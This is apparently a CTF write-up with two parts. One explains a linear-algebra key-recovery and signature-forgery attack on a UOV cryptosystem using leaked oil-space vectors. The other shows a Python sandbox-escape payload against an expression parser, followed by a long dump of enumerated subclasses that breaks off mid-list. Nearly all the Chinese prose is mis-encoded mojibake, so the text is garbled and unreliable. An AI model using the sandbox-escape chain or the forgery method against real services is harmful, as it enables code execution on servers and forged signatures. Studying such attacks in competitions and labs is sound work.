åœ¨é¢˜ç›®é‡Œï¼Œæ²¹ç©ºé—´ (O) æœ‰ä¸¤ä¸ªå…³é”®æ€§è´¨ï¼š

1. å¯¹ä»»æ„ (x\in O)ï¼Œæœ‰

   [
    x P_i x^T = 0,\quad\forall i
    ]
    ä¹Ÿå°±æ˜¯ **oil å‘é‡åœ¨æ‰€æœ‰äºŒæ¬¡å‹ä¸Šéƒ½æ˜¯å„å‘åŒæ€§**ï¼ˆtotally isotropicï¼‰ï¼›

2. å¯¹ä»»æ„ (x,y\in O)ï¼Œæœ‰

   [
    x P_i y^T = 0
    ]
    ä¹Ÿå°±æ˜¯**æ²¹â€“æ²¹ä¹‹é—´çš„åŒçº¿æ€§é¡¹ä¹Ÿä¸ºé›¶**ã€‚

è¿™åœ¨é¢˜ç›®ä»£ç é‡Œå°±æ˜¯ `cook_form` çš„å³ä¸‹å—ä¸ºé›¶ + `oil` ç”¨ `mix` çš„æœ€å m è¡Œæ„é€ å‡ºæ¥çš„ç›´æ¥ä½“ç°ã€‚

> æ‰€ä»¥æˆ‘ä»¬çš„åˆ¤å®šæ¡ä»¶ â€œåœ¨æ‰€æœ‰ (P_i) ä¸Šè‡ªä¹˜ä¸º 0 çš„å°±æ˜¯æ²¹â€ æ‰æ˜¯**æˆç«‹**çš„ã€‚

å¦‚æœé¢˜ç›®æ„é€ é‡Œï¼Œoilâ€“oil å—ä¸æ˜¯ä¸¥æ ¼ 0ï¼Œè€Œæ˜¯â€œå¾ˆå°â€â€œä½ç§©â€ä¹‹ç±»ï¼Œé‚£ä½ ç”¨ â€œ(xP_ix^T=0)â€ å°±ä¸ä¸€å®šèƒ½å¹²å‡€åˆ‡å‡ºæ²¹ç©ºé—´äº†ï¼Œè¿™æ¡è·¯å°±æ²¡è¿™ä¹ˆç›´æ¥äº†ã€‚

------

### ï¼ˆ3ï¼‰ä½ è‡³å°‘çŸ¥é“æ²¹ç©ºé—´é‡Œçš„ä¸€æ¡/å‡ æ¡å‘é‡ï¼ˆæ³„éœ²ï¼‰

è¿™å°±æ˜¯ä½ æ‹¿åˆ°çš„ `gather_oil` æ³„éœ²çš„ 3 æ¡å‘é‡ã€‚

å¯¹è¿™ç±»æ”»å‡»ï¼Œæœ‰ä¸¤ç§å¸¸è§æƒ…å†µï¼š

1. **é¢˜ç›®/å®ç°ç›´æ¥æ³„éœ²äº†æ²¹ç©ºé—´çš„å‘é‡**
   åƒè¿™é¢˜ï¼ŒæœåŠ¡ç«¯æœ‰ `leak_oil` æˆ–è€…ä¸€äº› side-channelï¼ŒæŠŠ (O) é‡Œçš„å‘é‡ç»™äº†ä½ ï¼›
2. **ä½ èƒ½é€šè¿‡ oracle/ç­¾åæŸ¥è¯¢æ„é€ å‡ºåœ¨æ²¹ç©ºé—´ä¸Šçš„å·®åˆ†**
   ä¾‹å¦‚æŸäº› UOV å®ç°é‡Œï¼Œä½ å¯ä»¥æ„é€ ï¼š
   [
   \sigma_1,\sigma_2\text{ ä¸ºåŒä¸€æ¶ˆæ¯çš„ä¸¤ä¸ªç­¾å}
   \Rightarrow \sigma_1-\sigma_2 \in O
   ]
   è¿™å®é™…ä¸Šä¹Ÿæ˜¯ç»™äº†ä½ æ²¹ç©ºé—´é‡Œçš„å‘é‡ã€‚

ä¸€æ—¦æœ‰äº†è¿™äº›å‘é‡ï¼Œå°±å¯ä»¥åƒä½ è„šæœ¬é‡Œé‚£æ ·ï¼š

- ç”¨è¿™äº›å‘é‡æ„é€ çº¿æ€§çº¦æŸï¼ˆJacobian é£æ ¼çš„çŸ©é˜µ Jï¼‰ï¼›
- å–æ ¸é™ä½ç»´åº¦ï¼›
- åœ¨é™ç»´åçš„å®ä¾‹ä¸Šç”¨â€œæ ¸æ³•â€æŠŠæ•´æ¡æ²¹ç©ºé—´æ‹‰å‡ºæ¥ã€‚

æ‰€ä»¥ï¼š**è¿™ä¸ªæ–¹æ³•æ˜¯â€œæ³„éœ²å‹æ”»å‡»â€** â€” æ²¡æœ‰æ²¹ç©ºé—´å‘é‡ï¼Œå°±æ²¡æ³•å¯åŠ¨ã€‚

------

### ï¼ˆ4ï¼‰ç»´åº¦å‚æ•°åœ¨æŸä¸ªèŒƒå›´ï¼šèƒ½é™åˆ°â€œå®¹æ˜“å®ä¾‹â€è§„æ¨¡

ä½ çš„è§£æ³•é‡Œæœ€æ ¸å¿ƒçš„ä¸€æ­¥æ˜¯ï¼š
 ç”¨ (\beta) æ¡æ²¹å‘é‡æ„é€ çŸ©é˜µ (J) å¹¶å–æ ¸ï¼ŒæŠŠåŸæœ¬çš„ (n) ç»´ç©ºé—´é™åˆ°

[
 n' = n - \beta m
 ]

åœ¨ä½ è¿™é¢˜é‡Œï¼š

- (n = 245)
- (m = 50)
- (\beta = 3)
  â‡’ (n' = 245 - 3 \cdot 50 = 95)

ç„¶ååœ¨è¿™ä¸ª (n'=95) çš„æ–°ç©ºé—´ä¸Šï¼Œæˆ‘ä»¬å†å»æ±‚æ²¹ç©ºé—´ï¼Œåˆ©ç”¨çš„æ˜¯ã€Œå¦‚æœ (n' < 2m)ï¼ŒUOV çš„ key-recovery å¯ä»¥ç”¨çº¯çº¿ä»£æ ¸æ³•æå®šã€è¿™ç§ç»“è®ºã€‚

æ‰€ä»¥è¿™ä¸ªæ–¹æ³•æœ‰æ•ˆçš„æ•°å­¦æ¡ä»¶ä¸€èˆ¬æ˜¯ï¼š

> èƒ½é€šè¿‡è‹¥å¹²æ¡æ²¹å‘é‡æŠŠç»´åº¦é™åˆ°
> [
> n' = n - \beta m \le 2m
> ]
>
> ä¹Ÿå°±æ˜¯
> [
> \beta \ge \left\lceil\frac{n - 2m}{m}\right\rceil = \left\lceil\frac{n}{m} - 2\right\rceil
> ]

å¯¹ä½ è¿™ä¸ªå‚æ•°ï¼š

- (n/m \approx 245 / 50 \approx 4.9)
- (\left\lceil 4.9 - 2 \right\rceil = \lceil 2.9\rceil = 3)

**åˆšå¥½ 3 æ¡æ²¹å‘é‡å°±å¤ŸæŠŠç©ºé—´å‹åˆ° (n' = 95 < 100 = 2m)**ï¼Œè¿™ä¸€ç‚¹å’Œé¢˜ç›®ç»™ `beta=3` çš„é€‰æ‹©æ˜¯é«˜åº¦å‘¼åº”çš„ï¼š

> æ ‡é¢˜â€œé†‹åŠ å¤ªå¤šå•¦â€ï¼Œå…¶å®å°±æ˜¯ï¼šç³»ç»Ÿéå¸¸ä¸å¹³è¡¡ï¼ˆé†‹ç»´å¾ˆå¤šï¼Œæ²¹ç»´æ¯”è¾ƒå°‘ï¼‰ï¼Œä½†åˆæ°æ°ç»™äº†åˆšå¥½ 3 æ¡æ²¹å‘é‡è®©ä½ èƒ½åšç»´åº¦å‹ç¼©ã€‚

å¦‚æœåœ¨åˆ«çš„å®ä¾‹é‡Œï¼š

- å‚æ•°å¾ˆå¹³è¡¡ï¼Œä¾‹å¦‚ (n \approx 2m)ï¼Œé‚£å…¶å®ä¸€æ¡æ²¹å‘é‡éƒ½ä¸éœ€è¦ï¼Œå°±å·²ç»æ˜¯â€œå®¹æ˜“å®ä¾‹â€ï¼Œå¯ä»¥ç›´æ¥ kernel attackï¼›
- å‚æ•°éå¸¸ä¸å¹³è¡¡ï¼Œä½†æ³„éœ²çš„æ²¹å‘é‡å¤ªå°‘ï¼Œå¯¼è‡´ (n' > 2m)ï¼Œé‚£ä½ è¿™å¥—â€œå…ˆé™ç»´å† kernelâ€çš„æµç¨‹å°±**å¯èƒ½ä¸å¤Ÿ**ï¼Œéœ€è¦ç”¨æ›´é‡çš„ç®—æ³•ï¼ˆæˆ–è€…å¹²è„†æ”»ä¸åŠ¨ï¼‰ã€‚

------

## 2. è¿™å¥—æ–¹æ³•æœ¬è´¨ä¸Šâ€œéœ€è¦çŸ¥é“/èƒ½åšåˆ°ä»€ä¹ˆâ€ï¼Ÿ

ä½ å¯ä»¥æŠŠä½ å†™çš„ solve.sage æŠ½è±¡æˆä¸€ä¸ªæ”»å‡»â€œæ¨¡æ¿â€ï¼Œå®ƒåœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹é€‚ç”¨ï¼š

### ä½ éœ€è¦æœ‰çš„â€œå·²çŸ¥ä¿¡æ¯â€

1. **å®Œæ•´å…¬é’¥å¤šé¡¹å¼**ï¼ˆä»¥çŸ©é˜µå½¢å¼ç»™å‡ºï¼‰ï¼š
   æ¯ä¸ª (P_i) éƒ½è¦èƒ½æ‹¿åˆ°ï¼Œå¦åˆ™å†™ä¸å‡º (x^T P_i x)ï¼›
2. **è‡³å°‘ä¸€æ¡ï¼ˆæˆ–å‡ æ¡ï¼‰æ²¹å­ç©ºé—´é‡Œçš„å‘é‡**ï¼š
   è¦ä¹ˆé¢˜ç›®ç»™ï¼Œè¦ä¹ˆä½ è‡ªå·±é€šè¿‡ç­¾åå·®åˆ†ç­‰æŠ€å·§æ„é€ ï¼›
3. **çŸ¥é“æ²¹ç©ºé—´ç»´åº¦ (m)**ï¼ˆæˆ–è‡³å°‘çŸ¥é“ (m) ä¸Šç•Œï¼‰ï¼š
   å› ä¸ºä½ åœ¨ kernel æ”¶é›†é˜¶æ®µè¦çŸ¥é“ä»€ä¹ˆæ—¶å€™åœï¼ˆæ”¶åˆ°äº† m æ¡çº¿æ€§æ— å…³å‘é‡ä¸ºæ­¢ï¼‰ï¼›
4. **ç¡®è®¤ç»“æ„ç¡®å®æ˜¯ UOV**ï¼Œä¸”æ²¹â€“æ²¹å—ä¸º 0 çš„é‚£ç§å…¸å‹å½¢å¼ï¼ˆç›¸ä¼¼å˜æ¢åæœ‰ä¸Šè¿°å—ç»“æ„ï¼‰ã€‚

### ä½ éœ€è¦èƒ½åšçš„â€œæ“ä½œèƒ½åŠ›â€

1. åšå¤§è§„æ¨¡æœ‰é™åŸŸçº¿æ€§ä»£æ•°ï¼š
   - (n) é‡çº§çš„çŸ©é˜µæ ¸ã€ç§©ï¼›
   - (n'\approx n - \beta m) ç»´åº¦ä¸‹ï¼Œå¯¹æ¯ä¸ª (G_i) æ±‚ kernelï¼›
   - è‹¥å¹² (m\times m) çš„çº¿æ€§æ–¹ç¨‹ç»„æ±‚è§£ï¼ˆç­¾åæ—¶çš„ vinegarâ†’oilï¼‰ã€‚
2. èƒ½åœ¨å†…å­˜é‡Œè£…ä¸‹è¿™äº›çŸ©é˜µï¼ˆå¯¹ CTF æä¾›çš„è§„æ¨¡ä¸€èˆ¬é—®é¢˜ä¸å¤§ï¼‰ï¼›
3. å¯¹ â€œGroebner ä¹‹ç±»éçº¿æ€§çš„çˆ†ç‚¸ç®—æ³•â€ æ²¡æœ‰ä¾èµ–ï¼Œçº¯çº¿ä»£å°±å¤Ÿã€‚

> æ‰€ä»¥ä½ åˆšæ‰é‚£ç§â€œä¸€ç›´å¡ç€æ²¡åŠ¨â€çš„æƒ…å†µï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ï¼šä¸€å¼€å§‹é‚£ç‰ˆè„šæœ¬èµ°äº† Groebnerï¼Œç®—æ³•å±‚é¢å¤ªé‡ï¼›ç°åœ¨è¿™ç‰ˆå…¨æ˜¯çŸ©é˜µæ ¸å’Œçº¿æ€§æ–¹ç¨‹ï¼ŒæŒ‰ä½ åé¦ˆå·²ç»èƒ½ç¨³å®šå‡º flagï¼Œå°±è¯´æ˜è¿™ä¸ªå‚æ•°å®Œå…¨åœ¨â€œçº¿ä»£å¯æ”»â€çš„åŒºé—´é‡Œã€‚

------

## 3. å®æˆ˜é‡Œä»€ä¹ˆæ—¶å€™å¯ä»¥è€ƒè™‘å¥—è¿™ä¸ªå¥—è·¯ï¼Ÿ

æ€»ç»“æˆä¸€å¥è¯ï¼š

> **â€œUOV + æ³„éœ²åˆ°æ²¹ç©ºé—´å‘é‡ + æ˜æ˜¾ä¸å¹³è¡¡å‚æ•°â€**ï¼Œå°±å¯ä»¥å¼ºçƒˆè€ƒè™‘ç”¨è¿™ä¸€ç±» key-recovery + ä¼ªé€ ç­¾åçš„çº¿ä»£æ”»å‡»ã€‚

æ›´å…·ä½“ç‚¹è¯´ï¼š

- ä½ çœ‹åˆ°æœåŠ¡ç«¯ä»£ç æœ‰ï¼š
  - æ˜æ˜¾æŠŠå˜é‡æ‹†æˆ vinegar / oilï¼›
  - ä¸­å¿ƒçŸ©é˜µé•¿å¾—åƒ
    `[[A, T], [T^T, 0]]`ï¼›
- or ä½ çœ‹åˆ° `identity_matrix()[n-m : , :] * mix` è¿™ç§æ„é€ ï¼›
- or æœ‰å‡½æ•°æè¿°â€œleak oilâ€ã€â€œgather_oilâ€ã€â€œsubspaceâ€ã€â€œç§˜å¯†å­ç©ºé—´â€ç­‰å…³é”®è¯ï¼›
- or å®ç°é‡Œèƒ½é€šè¿‡ä¸¤æ¬¡ç­¾åæ±‚å·®ï¼Œç¨³å®šå¾—åˆ°æ²¹ç©ºé—´å…ƒç´ ï¼›

å°±å¯ä»¥å¼€å§‹æƒ³ï¼š

1. **æ”¶é›†æ²¹å‘é‡**ï¼ˆä»æ³„éœ²æˆ–ç­¾åå·®åˆ†ä¸­æå–ï¼‰ï¼›
2. åˆ©ç”¨è¿™äº›å‘é‡æ„é€ ç±»ä¼¼ (J) çš„çº¿æ€§çº¦æŸï¼Œé€æ­¥é™ç»´ï¼›
3. çœ‹çœ‹ç©ºé—´é™åˆ°ä»€ä¹ˆè§„æ¨¡ï¼š
   - å¦‚æœå·²ç» (n' \le 2m)ï¼Œå¯ä»¥ç›´æ¥ç”¨ kernel approach æ¢å¤æ²¹ç©ºé—´ï¼›
   - å¦‚æœè¿˜åå¤§ï¼Œå°±åˆ†ææ˜¯å¦èƒ½å†æƒ³åŠæ³•æ‹¿æ›´å¤šæ²¹å‘é‡ã€æˆ–è€…ç»“åˆå…¶ä»–ç»“æ„åŒ–ä¿¡æ¯ï¼ˆä¾‹å¦‚ block-structured Tï¼‰ã€‚

åœ¨è¿™ä¸€ç±»åœºæ™¯ä¸‹ï¼Œä½ è¿™ä»½è„šæœ¬é‡Œçš„**ä¸‰å¤§æ¨¡å—**å‡ ä¹å¯ä»¥ç›´æ¥æ‹·è´å¤ç”¨ï¼š

- ä»æ³„éœ²é‡Œç­›æ²¹å‘é‡ï¼›
- æ„é€  (J) å¹¶å–æ ¸é™ç»´ + åœ¨é™ç»´å®ä¾‹é‡Œç”¨æ ¸æ³•æ”¶é›†æ²¹ç©ºé—´åŸºï¼›
- æ„é€ å˜æ¢ (T)ã€å˜æˆä¸­å¿ƒå½¢å¼ï¼Œå†è·‘ä¸€è½® UOV ç­¾åã€‚

------

## 4. ä¸€å¥è¯çš„æ€»ç»“

- è¿™ä¸ªè§£æ³• **ä¸æ˜¯** â€œä»»æ„ MQ ç³»ç»Ÿéƒ½èƒ½ç”¨â€çš„ä¸‡èƒ½é’¥åŒ™ï¼Œå®ƒä¸“é—¨é’ˆå¯¹ï¼š
  1. æœ‰å…¸å‹ UOV ç»“æ„ï¼ˆæ²¹â€“æ²¹å—ä¸º 0ï¼‰çš„ç³»ç»Ÿï¼›
  2. ä½ å·²ç»æŒæ¡äº†ä¸€æ¡/å‡ æ¡æ²¹ç©ºé—´ (O) çš„å‘é‡ï¼›
  3. ç»´åº¦æ»¡è¶³ (n - \beta m \le 2m) æˆ–è€…é€šè¿‡å¤šæ®µé™ç»´èƒ½æŠŠç³»ç»Ÿå˜æˆâ€œå®¹æ˜“å®ä¾‹â€ã€‚
- åœ¨è¿™ç±»æ¡ä»¶ä¸‹ï¼Œå®ƒæ˜¯ä¸€ä¸ª**å®Œå…¨åŸºäºçº¿æ€§ä»£æ•°ã€å¯æ‰©å±•åˆ°å®é™…å‚æ•°çš„ key-recovery + ä¼ªé€ ç­¾åæ”»å‡»**ï¼Œåƒä½ è¿™é¢˜å°±æ˜¯éå¸¸æ ‡å‡†çš„ä¸€æ¬¡åº”ç”¨ã€‚



# MISCæ–¹å‘ MISCæ–¹å‘ MISCæ–¹å‘

# Expression Parser

1.

```
().__class__.__bases__[0].__subclasses__()
è¿”å›
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'sys.legacy_event_handler'>, <class 'InterpreterID'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'ast.AST'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'itertools.accumulate'>, <class 'itertools.batched'>, <class 'itertools.chain'>, <class 'itertools.combinations'>, <class 'itertools.compress'>, <class 'itertools.count'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools.islice'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.starmap'>, <class 'itertools.takewhile'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'itertools.zip_longest'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class 'collections._deque_iterator'>, <class 'collections._deque_reverse_iterator'>, <class 'collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._not_given'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class '_sre.SRE_Template'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.Scanner'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib._abc.Loader'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'importlib.util._incompatible_extension_module_restrictions'>, <class '_tokenize.TokenizerIter'>, <class 'tokenize.Untokenizer'>, <class 'textwrap.TextWrapper'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>, <class 'ast.NodeVisitor'>, <class '_random.Random'>, <class '_sha2.SHA224Type'>, <class '_sha2.SHA256Type'>, <class '_sha2.SHA384Type'>, <class '_sha2.SHA512Type'>, <class '_socket.socket'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseConstants'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'dis._Unknown'>, <class 'dis.Bytecode'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class 'zlib._ZlibDecompressor'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile._path.InitializedState'>, <class 'zipfile._path.Path'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.message.Message'>, <class 'typing._Final'>, <class 'typing._NotIterable'>, typing.Any, <class 'typing._PickleUsingNameMixin'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.TemporaryDirectory'>, <class 'importlib.resources.abc.ResourceReader'>, <class 'importlib.resources._adapters.SpecLoaderAdapter'>, <class 'importlib.resources._adapters.TraversableResourcesLoader'>, <class 'importlib.resources._adapters.CompatibilityFiles'>, <class 'importlib.abc.MetaPathFinder'>, <class 'importlib.abc.PathEntryFinder'>, <class 'importlib.metadata.Sectioned'>, <class 'importlib.metadata.DeprecatedTuple'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.DeprecatedNonAbstract'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Lookup'>, <class 'importlib.metadata.Prepared'>, <class 'gunicorn.pidfile.Pidfile'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class 'gunicorn.sock.BaseSocket'>, <class 'gunicorn.arbiter.Arbiter'>, <class 'gettext.NullTranslations'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class 'shlex.shlex'>, <class 'gunicorn.reloader.InotifyReloader'>, <class 'gunicorn.config.Config'>, <class 'gunicorn.config.Setting'>, <class 'gunicorn.debug.Spew'>, <class 'gunicorn.app.base.BaseApplication'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_queue.SimpleQueue'>, <class 'queue.Queue'>, <class 'queue._PySimpleQueue'>, <class 'logging.handlers.QueueListener'>, <class 'socketserver.BaseServer'>, <class 'socketserver.ForkingMixIn'>, <class 'socketserver._NoThreads'>, <class 'socketserver.ThreadingMixIn'>, <class 'socketserver.BaseRequestHandler'>, <class 'logging.config.ConvertingMixin'>, <class 'logging.config.BaseConfigurator'>, <class 'gunicorn.glogging.Logger'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'gunicorn.http.body.ChunkedReader'>, <class 'gunicorn.http.body.LengthReader'>, <class 'gunicorn.http.body.EOFReader'>, <class 'gunicorn.http.body.Body'>, <class 'gunicorn.http.message.Message'>, <class 'gunicorn.http.unreader.Unreader'>, <class 'gunicorn.http.parser.Parser'>, <class 'gunicorn.http.wsgi.FileWrapper'>, <class 'gunicorn.http.wsgi.Response'>, <class 'platform._Processor'>, <class 'gunicorn.workers.workertmp.WorkerTmp'>, <class 'gunicorn.workers.base.Worker'>, <class 'gunicorn.workers.gthread.TConn'>, <class 'concurrent.futures.thread._WorkItem'>, <class 'multiprocessing.process.BaseProcess'>, <class 'multiprocessing.reduction._C'>, <class 'multiprocessing.reduction.AbstractReducer'>, <class 'multiprocessing.context.BaseContext'>, <class '__future__._Feature'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'http.client.HTTPConnection'>, <class 'mimetypes.MimeTypes'>, <class 'werkzeug._internal._Missing'>, <class 'markupsafe._MarkupEscapeHelper'>, <class 